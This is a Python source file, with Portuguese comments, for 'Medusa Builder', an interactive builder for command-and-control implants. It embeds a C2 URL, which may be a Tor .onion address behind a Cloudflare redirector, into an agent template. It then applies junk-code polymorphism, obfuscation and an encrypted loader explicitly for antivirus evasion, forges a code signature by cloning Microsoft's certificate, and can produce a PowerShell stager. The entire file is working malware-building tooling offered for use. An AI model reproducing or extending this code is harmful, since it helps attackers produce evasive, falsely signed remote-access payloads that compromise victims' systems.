import shutil
import questionary
import base64
import json
from pathlib import Path
from strategies.stager import run_stager_interactive
from strategies.signing import CodeSigningStrategy, NullSignature
from strategies.mutation import LoaderPackingStrategy
from rich.console import Console
from rich.panel import Panel 

console = Console()
BASE_DIR = Path(__file__).parent
AGENT_TEMPLATE_PATH = BASE_DIR / 'agente' / 'agent.py'
AGENT_TOR_TEMPLATE_PATH = BASE_DIR / 'agente' / 'agent_tor.py' 

PAYLOADS_DIR = BASE_DIR / 'payloads'

# --- Importações da Nova Arquitetura ---
from strategies.base import BuildContext
from strategies.obfuscation import StringObfuscationStrategy, IdentifierManglingStrategy
from strategies.compilation import PyInstallerCompilation, NuitkaCompilation, ScriptOutput
from strategies.mutation import JunkCodeInsertionStrategy

# Em Builder.py

class AgentBuilder:
    def __init__(self, config: dict):
        self.context = BuildContext(config)
        self.context.base_dir = BASE_DIR
        self.pipeline = []

    def add_step(self, strategy):
        self.pipeline.append(strategy)
        return self

    def _prepare_env(self):
        # Usa diretório dentro do projeto em vez de %TEMP% do sistema.
        # Evita que o Windows Defender bloqueie leitura do arquivo logo após escrita.
        import uuid
        self.context.build_dir = BASE_DIR / f'.build_{uuid.uuid4().hex[:8]}'
        self.context.build_dir.mkdir(parents=True, exist_ok=True)

        template_path = self.context.config['template_to_use']
        
        if not template_path.exists():
            raise FileNotFoundError(f"Arquivo de template não encontrado: {template_path}")

        agent_code = template_path.read_text(encoding='utf-8')

        patched_code = agent_code.replace("%%C2_SERVER_URL%%", self.context.config['c2_url'])
        # CDN_TOKEN: token secreto do redirector Cloudflare Worker.
        # Se nao configurado, o placeholder e substituido por string vazia
        # e o agente bate direto no C2 (sem redirector).
        cdn_token = self.context.config.get('cdn_token', '')
        patched_code = patched_code.replace("%%CDN_TOKEN%%", cdn_token)
        
        self.context.entry_script_path = self.context.build_dir / "patched_agent.py"
        self.context.entry_script_path.write_text(patched_code, encoding='utf-8')

    def _finalize_build(self):
        if self.context.final_artifact_path and self.context.final_artifact_path.exists():
            dest_path = PAYLOADS_DIR / self.context.final_artifact_path.name
            PAYLOADS_DIR.mkdir(exist_ok=True)
            shutil.move(str(self.context.final_artifact_path), dest_path)
            console.print(f"\n[bold green]SUCESSO! Agente salvo em: {dest_path}[/bold green]")
        else:
            console.print("\n[bold red]ERRO: Artefato final não encontrado.[/bold red]")

    def _cleanup(self):
        if self.context.build_dir:
            shutil.rmtree(self.context.build_dir, ignore_errors=True)

    def build(self):
        try:
            self._prepare_env()
            for i, step in enumerate(self.pipeline):
                console.print(f"\n--- Passo {i+1}/{len(self.pipeline)}: [bold cyan]{step.__class__.__name__}[/bold cyan] ---")
                self.context = step.execute(self.context)
            self._finalize_build()
        except Exception as e:
            import traceback
            console.print(f"\n[bold red]ERRO NO BUILD: {e}[/bold red]")
            console.print(traceback.format_exc())
        finally:
            self._cleanup()





def main_interactive():
    # --- Coleta de Respostas ---
    console.print(Panel("Medusa Builder", style="bold magenta", border_style="magenta", expand=False))
    
    main_choice = questionary.select(
        "O que você deseja construir?",
        choices=['Agente Final', 'Stager PowerShell', 'Sair']
    ).ask()

    if main_choice is None or main_choice == 'Sair':
        console.print("\n[info]Operação finalizada.[/info]")
        return

    if main_choice == 'Stager PowerShell':
        run_stager_interactive()
        return

    # --- Se a escolha for 'Agente Final', o código abaixo é executado ---
    answers = {} 
    

    connection_choice = questionary.select(
        "Qual método de conexão o agente deve usar?",
        choices=[
            "Conexão Direta (URL normal, ex: https://meuservidor.com )",
            "Conexão via Tor (URL .onion, requer Tor Browser no alvo)"
        ]
    ).ask()

    if not connection_choice: raise KeyboardInterrupt

    if connection_choice == "Conexão via Tor (URL .onion, requer Tor Browser no alvo)":
        # Configura para o Tor
        answers['template_to_use'] = AGENT_TOR_TEMPLATE_PATH
        c2_url = questionary.text("URL do C2 (.onion):").ask()
        if c2_url and not c2_url.startswith('http://' ):
            c2_url = 'http://' + c2_url
        answers['c2_url'] = c2_url
        console.print("[info]Modo Tor selecionado. Usando 'agent_tor.py' como template.[/info]" )
    else:
        # Configura DNS Direto
        answers['template_to_use'] = AGENT_TEMPLATE_PATH
        c2_url = questionary.text("URL do C2 (normal):").ask()
        if c2_url and not (c2_url.startswith('http://' ) or c2_url.startswith('https://' )):
            c2_url = 'https://' + c2_url
        answers['c2_url'] = c2_url
        console.print("[info]Modo de Conexão Direta selecionado. Usando 'agent.py' como template.[/info]" )

    if not answers.get('c2_url'):
        console.print("[bold red]URL do C2 não fornecida. Operação cancelada.[/bold red]")
        return

    use_redirector = questionary.confirm("Usar Cloudflare Worker como redirector?", default=False).ask()
    if use_redirector:
        cdn_token = questionary.text("CDN Token (REDIRECT_SECRET configurado no Worker):").ask()
        answers['cdn_token'] = cdn_token.strip() if cdn_token else ''
    else:
        answers['cdn_token'] = ''

    answers['platform'] = questionary.select("Plataforma Alvo:", choices=['windows', 'linux']).ask()
    answers['type'] = questionary.select("Tipo de Saída:", choices=['executável', 'script (.py)']).ask()
    answers['polymorphic'] = questionary.confirm("Aplicar polimorfismo avançado (código lixo)?").ask()
    answers['obfuscate'] = questionary.confirm("Aplicar ofuscação (nomes e strings)?").ask()
    answers['use_loader'] = questionary.confirm("Empacotar com loader criptografado (alta evasão)?").ask()
    
    if answers['type'] == 'executável':
        answers['compiler'] = questionary.select("Compilador:", choices=['pyinstaller', 'nuitka']).ask()
        ext = 'exe' if answers['platform'] == 'windows' else 'elf'
        default_name = f"agent.{ext}"
        answers['output'] = questionary.text("Nome do arquivo de saída:", default=default_name).ask()
        extra_args_str = questionary.text("Argumentos extras para o compilador (ex: --windows-icon-from-ico=icon.ico):").ask()
        answers['extra_args'] = extra_args_str.split() if extra_args_str else []

        if answers['platform'] == 'windows':
            answers['sign_executable'] = questionary.confirm("Deseja forjar assinatura de código (requer sigthief.py)?").ask()
            if answers['sign_executable']:
                answers['sign_host'] = questionary.text("Host para clonar certificado:", default="www.microsoft.com").ask()

    else: # Se o tipo for 'script (.py)'
        default_name = "agent.py"
        answers['output'] = questionary.text("Nome do arquivo de saída:", default=default_name).ask()

    # --- Montagem do Pipeline ---
    console.print("\n[bold blue]Iniciando montagem do pipeline de build...[/bold blue]")
    builder = AgentBuilder(answers)

    if answers.get('polymorphic'):
        builder.add_step(JunkCodeInsertionStrategy())
    if answers.get('obfuscate'):
        builder.add_step(StringObfuscationStrategy())
        builder.add_step(IdentifierManglingStrategy())
    if answers.get('use_loader'):
        builder.add_step(LoaderPackingStrategy())

    if answers['type'] == 'executável':
        if answers.get('compiler') == 'nuitka':
            builder.add_step(NuitkaCompilation())
        else:
            builder.add_step(PyInstallerCompilation())
            
        if answers.get('sign_executable'):
            builder.add_step(CodeSigningStrategy())
            
    else:
        builder.add_step(ScriptOutput())

    builder.build()


if __name__ == "__main__":
    main_interactive()